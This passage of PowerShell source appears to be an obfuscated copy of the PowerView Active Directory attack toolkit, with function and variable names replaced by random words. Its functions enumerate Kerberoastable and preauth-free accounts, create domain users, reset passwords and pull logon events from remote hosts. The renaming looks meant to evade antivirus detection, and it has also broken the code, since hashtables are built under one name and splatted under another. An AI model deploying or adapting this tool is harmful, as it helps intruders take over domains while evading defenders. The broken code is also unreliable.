        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $lhajTlHJ99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $ySwVcJfM99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $hBrutxlf99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['LDAPFilter']) { $nlvvSWoK99['LDAPFilter'] = $NzjfVMfT99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $RtuCSCyh99 = foretasted -Domain $JXWXuoyG99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $RtuCSCyh99 = foretasted -Domain $JXWXuoyG99 -Credential $tYWiEqAT99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[emasculation] Enumerated forest '$RtuCSCyh99' for target domain '$JXWXuoyG99'"
        }

        $ZZAQWlJd99 = @{}
        if ($PSBoundParameters['Credential']) { $ZZAQWlJd99['Credential'] = $tYWiEqAT99 }
        if ($RtuCSCyh99) {
            $ZZAQWlJd99['Forest'] = $RtuCSCyh99
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[emasculation] Using specified -ReferencePropertySet"
            $FpzmmgAU99 = $eUYfAtbv99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[emasculation] Extracting property names from -ReferenceObject to use as the reference property set"
            $FpzmmgAU99 = Get-Member -InputObject $YAFcRrIA99 -MemberType NoteProperty | Select-Object -Expand Name
            $gWVpeMfP99 = $YAFcRrIA99.objectclass | Select-Object -Last 1
            Write-Verbose "[emasculation] Calculated ReferenceObjectClass : $gWVpeMfP99"
        }
        else {
            Write-Verbose "[emasculation] Using the default reference property set for the object class '$rXZqIUez99'"
        }

        if (($rXZqIUez99 -eq 'User') -or ($gWVpeMfP99 -eq 'User')) {
            $qHdESjOI99 = asseverate @SearcherArguments
            if (-not $FpzmmgAU99) {
                $FpzmmgAU99 = $lhajTlHJ99
            }
        }
        elseif (($rXZqIUez99 -eq 'Group') -or ($gWVpeMfP99 -eq 'Group')) {
            $qHdESjOI99 = walnuts @SearcherArguments
            if (-not $FpzmmgAU99) {
                $FpzmmgAU99 = $ySwVcJfM99
            }
        }
        elseif (($rXZqIUez99 -eq 'Computer') -or ($gWVpeMfP99 -eq 'Computer')) {
            $qHdESjOI99 = undergrad @SearcherArguments
            if (-not $FpzmmgAU99) {
                $FpzmmgAU99 = $hBrutxlf99
            }
        }
        else {
            throw "[emasculation] Invalid class: $rXZqIUez99"
        }

        ForEach ($Object in $qHdESjOI99) {
            $gAyJrOjX99 = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($TNWbKjRU99 in $gAyJrOjX99) {
                if ($FpzmmgAU99 -NotContains $TNWbKjRU99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $TNWbKjRU99
                    $Out | Add-Member Noteproperty 'Value' $Object.$TNWbKjRU99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}



function asseverate {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $lmPsrtYT99,

        [Switch]
        $SPN,

        [Switch]
        $SzRgrLzc99,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $ecUWukVM99,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $JiVNwmPO99,

        [Switch]
        $SWDbNIfj99,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $YqCyFYbc99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $zDGJtxPl99 = [Enum]::GetNames($CUtwcuxc99)
        $zDGJtxPl99 = $zDGJtxPl99 | ForEach-Object {$_; "NOT_$_"}
        pecuniary -Name UACFilter -ValidateSet $zDGJtxPl99 -Type ([array])
    }

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $BbNqTbLk99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pecuniary -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($BbNqTbLk99) {
            $OfuxkWWH99 = ''
            $HLDsNhab99 = ''
            $lmPsrtYT99 | Where-Object {$_} | ForEach-Object {
                $svVwDJqZ99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($svVwDJqZ99 -match '^S-1-') {
                    $OfuxkWWH99 += "(objectsid=$svVwDJqZ99)"
                }
                elseif ($svVwDJqZ99 -match '^CN=') {
                    $OfuxkWWH99 += "(distinguishedname=$svVwDJqZ99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $QaLnxLKT99 = $svVwDJqZ99.SubString($svVwDJqZ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[asseverate] Extracted domain '$QaLnxLKT99' from '$svVwDJqZ99'"
                        $nlvvSWoK99['Domain'] = $QaLnxLKT99
                        $BbNqTbLk99 = misbehaves @SearcherArguments
                        if (-not $BbNqTbLk99) {
                            Write-Warning "[asseverate] Unable to retrieve domain searcher for '$QaLnxLKT99'"
                        }
                    }
                }
                elseif ($svVwDJqZ99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $TsiMgfqm99 = (([Guid]$svVwDJqZ99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $OfuxkWWH99 += "(objectguid=$TsiMgfqm99)"
                }
                elseif ($svVwDJqZ99.Contains('\')) {
                    $oGNyGKhb99 = $svVwDJqZ99.Replace('\28', '(').Replace('\29', ')') | oared -OutputType Canonical
                    if ($oGNyGKhb99) {
                        $thGIxDFy99 = $oGNyGKhb99.SubString(0, $oGNyGKhb99.IndexOf('/'))
                        $OvZZajfU99 = $svVwDJqZ99.Split('\')[1]
                        $OfuxkWWH99 += "(samAccountName=$OvZZajfU99)"
                        $nlvvSWoK99['Domain'] = $thGIxDFy99
                        Write-Verbose "[asseverate] Extracted domain '$thGIxDFy99' from '$svVwDJqZ99'"
                        $BbNqTbLk99 = misbehaves @SearcherArguments
                    }
                }
                else {
                    $OfuxkWWH99 += "(samAccountName=$svVwDJqZ99)"
                }
            }

            if ($OfuxkWWH99 -and ($OfuxkWWH99.Trim() -ne '') ) {
                $HLDsNhab99 += "(|$OfuxkWWH99)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[asseverate] Searching for non-null service principal names'
                $HLDsNhab99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[asseverate] Searching for users who can be delegated'
                $HLDsNhab99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[asseverate] Searching for users who are sensitive and not trusted for delegation'
                $HLDsNhab99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[asseverate] Searching for adminCount=1'
                $HLDsNhab99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[asseverate] Searching for users that are trusted to authenticate for other principals'
                $HLDsNhab99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[asseverate] Searching for user accounts that do not require kerberos preauthenticate'
                $HLDsNhab99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[asseverate] Using additional LDAP filter: $NzjfVMfT99"
                $HLDsNhab99 += "$NzjfVMfT99"
            }

            $aAspXtoB99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $qBymjplF99 = $_.Substring(4)
                    $pLCGACce99 = [Int]($CUtwcuxc99::$qBymjplF99)
                    $HLDsNhab99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99))"
                }
                else {
                    $pLCGACce99 = [Int]($CUtwcuxc99::$_)
                    $HLDsNhab99 += "(userAccountControl:1.2.840.113556.1.4.803:=$pLCGACce99)"
                }
            }

            $BbNqTbLk99.filter = "(&(samAccountType=805306368)$HLDsNhab99)"
            Write-Verbose "[asseverate] filter string: $($BbNqTbLk99.filter)"

            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $BbNqTbLk99.FindOne() }
            else { $DEbeunXw99 = $BbNqTbLk99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = Jagger -Properties $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[asseverate] Error disposing of the Results object: $_"
                }
            }
            $BbNqTbLk99.dispose()
        }
    }
}


function bowman {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $dKvoAcKU99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $UsrZveRW99,

        [ValidateNotNullOrEmpty()]
        [String]
        $Name,

        [ValidateNotNullOrEmpty()]
        [String]
        $cAmTbDkn99,

        [ValidateNotNullOrEmpty()]
        [String]
        $vHoAkSpC99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $lmVKeZxb99 = @{
        'Identity' = $dKvoAcKU99
    }
    if ($PSBoundParameters['Domain']) { $lmVKeZxb99['Domain'] = $JXWXuoyG99 }
    if ($PSBoundParameters['Credential']) { $lmVKeZxb99['Credential'] = $tYWiEqAT99 }
    $mLYECpfd99 = vignetting @ContextArguments

    if ($mLYECpfd99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($mLYECpfd99.Context)

        $User.SamAccountName = $mLYECpfd99.Identity
        $zLBhsPkt99 = New-Object System.Management.Automation.PSCredential('a', $UsrZveRW99)
        $User.SetPassword($zLBhsPkt99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False

        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $mLYECpfd99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $cAmTbDkn99
        }
        else {
            $User.DisplayName = $mLYECpfd99.Identity
        }

        if ($PSBoundParameters['Description']) {
            $User.Description = $vHoAkSpC99
        }

        Write-Verbose "[bowman] Attempting to create user '$dKvoAcKU99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[bowman] User '$dKvoAcKU99' successfully created"
            $User
        }
        catch {
            Write-Warning "[bowman] Error creating user '$dKvoAcKU99' : $_"
        }
    }
}


function calmer {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $lmPsrtYT99,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $UsrZveRW99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $lmVKeZxb99 = @{ 'Identity' = $lmPsrtYT99 }
    if ($PSBoundParameters['Domain']) { $lmVKeZxb99['Domain'] = $JXWXuoyG99 }
    if ($PSBoundParameters['Credential']) { $lmVKeZxb99['Credential'] = $tYWiEqAT99 }
    $mLYECpfd99 = vignetting @ContextArguments

    if ($mLYECpfd99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($mLYECpfd99.Context, $lmPsrtYT99)

        if ($User) {
            Write-Verbose "[calmer] Attempting to set the password for user '$lmPsrtYT99'"
            try {
                $zLBhsPkt99 = New-Object System.Management.Automation.PSCredential('a', $UsrZveRW99)
                $User.SetPassword($zLBhsPkt99.GetNetworkCredential().Password)

                $Null = $User.Save()
                Write-Verbose "[calmer] Password for user '$lmPsrtYT99' successfully reset"
            }
            catch {
                Write-Warning "[calmer] Error setting password for user '$lmPsrtYT99' : $_"
            }
        }
        else {
            Write-Warning "[calmer] Unable to find user '$lmPsrtYT99'"
        }
    }
}


function Ludhiana {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $KOQHhTKJ99 = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EqqTrDhS99 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $WZeonQKA99 = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $RIQXkRFq99 = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($KOQHhTKJ99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EqqTrDhS99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($KOQHhTKJ99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($EqqTrDhS99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $hLJhtipE99 = @{
            'FilterXPath' = $RIQXkRFq99
            'LogName' = 'Security'
            'MaxEvents' = $WZeonQKA99
        }
        if ($PSBoundParameters['Credential']) { $hLJhtipE99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {

            $hLJhtipE99['ComputerName'] = $BoJggNks99

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $hqDcSuel99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $hqDcSuel99[5].Value.EndsWith('$')) {
                            $MWaxCMux99 = New-Object PSObject -Property @{
                                ComputerName              = $BoJggNks99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $hqDcSuel99[0].Value.ToString()
                                SubjectUserName           = $hqDcSuel99[1].Value
                                SubjectDomainName         = $hqDcSuel99[2].Value
                                SubjectLogonId            = $hqDcSuel99[3].Value
                                TargetUserSid             = $hqDcSuel99[4].Value.ToString()
                                TargetUserName            = $hqDcSuel99[5].Value
                                TargetDomainName          = $hqDcSuel99[6].Value
                                TargetLogonId             = $hqDcSuel99[7].Value
                                LogonType                 = $hqDcSuel99[8].Value
                                LogonProcessName          = $hqDcSuel99[9].Value
                                AuthenticationPackageName = $hqDcSuel99[10].Value
                                WorkstationName           = $hqDcSuel99[11].Value
                                LogonGuid                 = $hqDcSuel99[12].Value
                                TransmittedServices       = $hqDcSuel99[13].Value
                                LmPackageName             = $hqDcSuel99[14].Value
                                KeyLength                 = $hqDcSuel99[15].Value
                                ProcessId                 = $hqDcSuel99[16].Value
                                ProcessName               = $hqDcSuel99[17].Value
                                IpAddress                 = $hqDcSuel99[18].Value
                                IpPort                    = $hqDcSuel99[19].Value
                                ImpersonationLevel        = $hqDcSuel99[20].Value
                                RestrictedAdminMode       = $hqDcSuel99[21].Value
                                TargetOutboundUserName    = $hqDcSuel99[22].Value
                                TargetOutboundDomainName  = $hqDcSuel99[23].Value
                                VirtualAccount            = $hqDcSuel99[24].Value
                                TargetLinkedLogonId       = $hqDcSuel99[25].Value
                                ElevatedToken             = $hqDcSuel99[26].Value
                            }
                            $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $MWaxCMux99
                        }
                    }

                    4648 {
                        if((-not $hqDcSuel99[5].Value.EndsWith('$')) -and ($hqDcSuel99[11].Value -match 'taskhost\.exe')) {
                            $MWaxCMux99 = New-Object PSObject -Property @{
                                ComputerName              = $BoJggNks99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $hqDcSuel99[0].Value.ToString()
                                SubjectUserName   = $hqDcSuel99[1].Value
                                SubjectDomainName = $hqDcSuel99[2].Value
                                SubjectLogonId    = $hqDcSuel99[3].Value
                                LogonGuid         = $hqDcSuel99[4].Value.ToString()
                                TargetUserName    = $hqDcSuel99[5].Value
                                TargetDomainName  = $hqDcSuel99[6].Value
                                TargetLogonGuid   = $hqDcSuel99[7].Value
                                TargetServerName  = $hqDcSuel99[8].Value
                                TargetInfo        = $hqDcSuel99[9].Value
                                ProcessId         = $hqDcSuel99[10].Value
                                ProcessName       = $hqDcSuel99[11].Value
                                IpAddress         = $hqDcSuel99[12].Value
                                IpPort            = $hqDcSuel99[13].Value
                            }
                            $MWaxCMux99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $MWaxCMux99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}


function Welch {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $XBKXeDUj99 = @{}
    if ($PSBoundParameters['Credential']) { $XBKXeDUj99['Credential'] = $tYWiEqAT99 }

    try {
        $WjkovVKR99 = (muesli @ForestArguments).schema.name
    }
    catch {
        throw '[Welch] Error in retrieving forest schema path from muesli'
    }
    if (-not $WjkovVKR99) {
        throw '[Welch] Error in retrieving forest schema path from muesli'
    }

    $nlvvSWoK99 = @{
        'SearchBase' = $WjkovVKR99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
    if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
    if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
    if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
    $WmArVhJN99 = misbehaves @SearcherArguments

    if ($WmArVhJN99) {
        try {
            $DEbeunXw99 = $WmArVhJN99.FindAll()
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[Welch] Error disposing of the Results object: $_"
                }
            }
            $WmArVhJN99.dispose()
        }
        catch {
            Write-Verbose "[Welch] Error in building GUID map: $_"
        }
    }

    $nlvvSWoK99['SearchBase'] = $WjkovVKR99.replace('Schema','Extended-Rights')
    $nlvvSWoK99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $IYNzFGYg99 = misbehaves @SearcherArguments

    if ($IYNzFGYg99) {
        try {
            $DEbeunXw99 = $IYNzFGYg99.FindAll()
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[Welch] Error disposing of the Results object: $_"
                }
            }
            $IYNzFGYg99.dispose()
        }
        catch {
            Write-Verbose "[Welch] Error in building GUID map: $_"
        }
    }

    $GUIDs
}


function undergrad {

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $lmPsrtYT99,

        [Switch]
        $eWrtIVpV99,

        [Switch]
        $SWDbNIfj99,

        [Switch]
        $nrmUPNSR99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $kOjIFfIK99,

        [ValidateNotNullOrEmpty()]
        [String]
        $iZbiKaWr99,

        [ValidateNotNullOrEmpty()]
        [String]
        $UHxOuyqA99,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $zDGJtxPl99 = [Enum]::GetNames($CUtwcuxc99)
        $zDGJtxPl99 = $zDGJtxPl99 | ForEach-Object {$_; "NOT_$_"}
        pecuniary -Name UACFilter -ValidateSet $zDGJtxPl99 -Type ([array])
    }

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
